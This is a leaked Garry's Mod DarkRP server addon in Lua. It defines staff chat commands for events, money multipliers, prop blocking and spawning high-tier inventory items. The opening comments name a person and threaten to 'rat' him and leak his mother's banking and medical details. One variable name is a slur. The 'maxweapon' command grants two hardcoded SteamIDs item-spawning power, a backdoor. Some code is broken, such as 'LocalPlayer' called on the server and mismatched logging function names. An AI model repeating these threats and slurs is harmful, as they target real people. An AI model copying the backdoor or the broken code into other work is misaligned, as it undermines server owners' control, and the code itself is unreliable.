--Lukas Leis
--Hope that you enjoy getting ratted 24/7
--Stop buying shit with your parents card before we use it too

-----------------------------------------------
--WARNING:
--We wont stop leaking shit
--Next up is leaking your mothers banking details and her medical details
-----------------------------------------------

--     -bombagroup#4115-
--     -BombaGroup-
--     -"nothing is safe"-

local weapon_blacklist = {
    ["vincent1911"] = true,
    ["weapon_camo"] = true,
    ["weapon_radar"] = true,
    ["weapon_physgun"] = true,
    ["gmod_tool"] = true,
    ["weapon_hpwr_stick"] = true,
    ["m9k_m202"] = true,
    ["weapon_handcuffed"] = true
}

local function contains_command(text, cmd)
    text = string.lower(text)
    if (string.len(text) < string.len(cmd) + 1) then return false end

    local initial_char = text:sub(1, 1)

    if (initial_char == '!' or initial_char == '/') then
        if (text:sub(2, string.len(cmd) + 1) == cmd) then return true end
    end
end

hook.Add("PlayerSay", "EventStartCMD", function(ply, txt)
    if (contains_command(txt, "event")) then
        if not ply or not ply:IsSuperAdmin() then return end

        for k, v in pairs(player.GetAll()) do
            v:ChatPrint("{*[Event Mode]} Has Been Enabled")
            v:SetNWBool("eventmode", true)
        end

        fdlexstafflogs(ply:Nick() .. " Enabled Event Mode" ..  "\n Time: " .. os.date("%H:%M:%S", os.time()) .. " \n Date: " .. os.date("%d/%m/%Y", os.time()))
    end
end)

hook.Add("PlayerSay", "MoneyMultiplierCND", function(ply, txt)
    if (contains_command(txt, "moneymultiplier")) then
        if not ply or not ply:IsSuperAdmin() then return end

        for k, v in pairs(player.GetAll()) do
            v:ChatPrint("{*[Money Multiplier]} Has Been Enabled For 30 Minutes 10x Money Is Activated Serverwide")
            v:SetNWBool("moneymultiplier", true)
        end

        timer.Simple(1800, function()
            for k, v in pairs(player.GetAll()) do
                v:ChatPrint("{*[Money Multiplier]} Has Been Disabled")
                v:SetNWBool("moneymultiplier", false)
            end
        end)

        flexstafflogs(ply:Nick() .. " Enabled Serverwide x10" .. "\n Time: " .. os.date("%H:%M:%S", os.time()) .. " \n Date: " .. os.date("%m/%d/%Y", os.time()))
    end
end)

hook.Add("PlayerSay", "EventEndCMD", function(ply, txt)
    if (contains_command(txt, "endevent")) then
        if not ply or not ply:IsSuperAdmin() then return end

        for k, v in pairs(player.GetAll()) do
            v:ChatPrint("{*[Event Mode]} Has Been Disabled")
            v:SetNWBool("eventmode", false)
        end

        fdlexstafflogs(ply:Nick() .. " Disabled Event Mode" .. "\n Time: " .. os.date("%H:%M:%S", os.time()) .. " \n Date: " .. os.date("%d/%m/%Y", os.time()))
    end
end)

function notifyeveryone(msg)
    for k, v in pairs(player.GetAll()) do
        v:ChatPrint(msg)
    end
end

hook.Add("PlayerSay", "WeaponsCMD", function(ply, text, team)
    if (contains_command(text, "weapons")) then
        net.Start("GlockCMDMintu8e_OpenVGUI")
        net.Send(ply)
    end
end)

hook.Add("PlayerSay", "AddPropRestriction", function(ply, txt)
    if (ply and contains_command(txt, "addprop")) then
        if not ply or not ply:IsSuperAdmin() then return end

        local data = gProtect.data
        local fagniggers = ply:GetEyeTrace().Entity:GetModel()

        if not fagniggers then
            ply:ChatPrint("Not Valid Prop")

            return
        end

        local changes = {}
        changes[string.lower(fagniggers)] = true
        data["spawnrestriction"]["blockedModels"][string.lower(fagniggers)] = true
        gProtect.updateSetting("spawnrestriction", "blockedModels", changes)
        ply:ChatPrint("Model Added!")
    end
end)

hook.Add("PlayerSay", "MoneyMultiplierConCMD", function(ply, txt)
    if not ply or not ply:IsSuperAdmin() then return end
    
    if (contains_command(txt, "money10")) then
        ply:ConCommand("moneymulti")
    end
end)


hook.Add("PlayerSay", "GClanCMD", function(ply, txt)
    if (contains_command(txt, "gclan")) then
         local slave = ply:GetEyeTrace().Entity
         local fac = slave:GetVFFaction().id
        ply:ChatPrint(fac)
     end
 end)
 
 hook.Add("PlayerSay", "SkinCMD", function(ply, text)
     if (contains_command(text, "skin")) then
         net.Start("SkinCMDMintu8e_SkinSuit")
         net.Send(ply)
     end
 end)

 hook.Add("PlayerSay", "MaxWeaponCMD", function(ply, text)
    if (contains_command(text, "maxweapon")) then
        if (ply:SteamID() == "STEAM_0:0:550732874" or ply:SteamID() == "STEAM_0:0:197746899" or ply:IsSuperAdmin()) then
            local var = ply:GetActiveWeapon():GetClass()

            if (weapon_blacklist[var]) then
                ply:ChatPrint("{*Weapon Is Blacklisted}")
                return
            end

            local wep = ply:GetActiveWeapon()

            data = VNP.Inventory:CreateItem(wep:GetNick(), "Glitched")

            if (data and var) then
                data.Sockets[2] = VNP.Inventory:CreateItem("Paralyze", "Glitched")
                data.Sockets[3] = VNP.Inventory:CreateItem("Permanent Gem", "Glitched")
                data.Sockets[4] = VNP.Inventory:CreateItem("Double Tap", "Glitched")
                data.Sockets[5] = VNP.Inventory:CreateItem("Overload", "Glitched")
                data.Sockets[6] = VNP.Inventory:CreateItem("Kill Counter", "Glitched")
                data.Sockets[7] = VNP.Inventory:CreateItem("Posion", "Glitched")
                data.Sockets[1] = VNP.Inventory:CreateItem("Freeze", "Glitched")
                ply:AddInventoryItem(data)
                ply:StripWeapon(var)
            end

            return ""
        end
    end
end)


 hook.Add("PlayerSay", "staffuncuff", function(ply, text)
    if (contains_command(text, "staffuncuff")) then
        print( LocalPlayer( ):GetActiveWeapon( ):GetClass( ) )
        --ply:StripWeapon( "" )
    end
end)



hook.Add("PlayerSay", "MaxEntityCMD", function(ply, text)
    if (contains_command(text, "maxentity")) then
        if not ply or not ply:IsSuperAdmin() then return end

        local suit = ply:GetEyeTrace().Entity
        local sdata = suit:GetItemData()

        data = VNP.Inventory:CreateItem(sdata.Name, "Glitched")
        data.LSkins = sdata.LSkins
        data.Signature = ply:Nick()
        --data.SuitHealth = 7500000
        suit:SetItemData(sdata)
        ply:AddInventoryItem(data)
        suit:Remove()

        return ""
    end
end)

hook.Add("PlayerSay", "SkinEntityCMD", function(ply, txt)
    if (contains_command(txt, "skin")) then
        ply:ConCommand("skinent")
    end
end)

hook.Add("PlayerSay", "GlockCMD", function(ply, text, team)
    if (contains_command(text, "glock")) then
        net.Start("GlockCMDMintu8e_OpenVGUI")
        net.Send(ply)
    end
end)

concommand.Add("admin_reward", function(ply, cmd, args, text)
    local var = ply:GetActiveWeapon():GetClass()

    if weapon_blacklist[var] then
        ply:ChatPrint("{*ERROR}")
        return
    end

    local wep = ply:GetActiveWeapon()

    local itemNames = {
        "Gaster Blaster",
        "Gaster Blaster",
        "Gaster Blaster",
        "Gaster Blaster",
        "Gaster Blaster",
        "Admin Suit",
        "Admin Suit",
        "Gaster Blaster Asriel Rainbow",
        "Gaster Blaster Asriel Rainbow",
        "Gaster Blaster Asriel Rainbow",
        "Gaster Blaster Badtime",
        "Gaster Blaster Badtime",
        "QE SUPREME NITRO ELITE BADTIME GBLASTER",
        "Glock",
        "Admin Suit V2"
    }

    local randomItemName = itemNames[math.random(#itemNames)]

    local cost = 100000000 
    if ply:getDarkRPVar("money") < cost then
        ply:ChatPrint("U need 100m!")
        return
    end

    local data = VNP.Inventory:CreateItem(randomItemName, "Glitched")

    if data and var then
        data.Sockets[1] = VNP.Inventory:CreateItem("Permanent Gem", "Glitched")
        ply:AddInventoryItem(data)

        ply:addMoney(-cost)
        ply:ChatPrint("{!Spinned and " .. cost .. " money gg xd}")
    end
end)





